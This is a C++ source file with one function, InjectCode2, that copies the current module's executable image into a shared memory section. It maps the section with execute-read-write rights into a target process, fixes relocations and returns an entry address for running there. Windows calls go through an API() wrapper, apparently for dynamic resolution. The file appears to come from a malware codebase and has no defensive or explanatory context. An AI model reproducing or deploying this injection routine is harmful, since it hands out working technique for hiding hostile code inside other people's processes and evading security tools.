#include "core\injects.h"
#include "core\pe.h"
#include "core\debug.h"

SIZE_T InjectCode2( HANDLE hprocess, typeFuncThread startFunc, HMODULE* newBaseImage )
{
	HMODULE imageBase = PE::GetImageBase(startFunc);
	DWORD sizeOfImage = PE::SizeOfImage(imageBase);

	HANDLE hmap = API(KERNEL32, CreateFileMappingA)( (HANDLE)-1, nullptr, PAGE_EXECUTE_READWRITE, 0, sizeOfImage, nullptr );

    void* view = API(KERNEL32, MapViewOfFile)( hmap, FILE_MAP_WRITE, 0, 0, 0 );
	if( !view )	return false;

	Mem::Copy( view, (void*)imageBase, sizeOfImage );

	SIZE_T viewSize    = 0;
	SIZE_T newBaseAddr = 0;
	SIZE_T addr = 0;

	NTSTATUS status = API(NTDLL, ZwMapViewOfSection)( hmap, hprocess, (PVOID*)&newBaseAddr, 0, sizeOfImage, nullptr, &viewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE );

	if( status == STATUS_SUCCESS )
	{
		PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)imageBase;
		PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS) ((byte*)pdh + pdh->e_lfanew);

		ULONG relRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG relSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
		PE::ProcessRelocs( (PIMAGE_BASE_RELOCATION)((SIZE_T)imageBase + relRVA ), (SIZE_T)view, newBaseAddr - (SIZE_T)imageBase, relSize );

		addr = (SIZE_T)startFunc - (SIZE_T)imageBase + newBaseAddr;
	}
	if( newBaseImage ) *newBaseImage = (HMODULE)newBaseAddr;
	API(KERNEL32, UnmapViewOfFile)(view);
    API(KERNEL32, CloseHandle)(hmap);

	return addr;
}

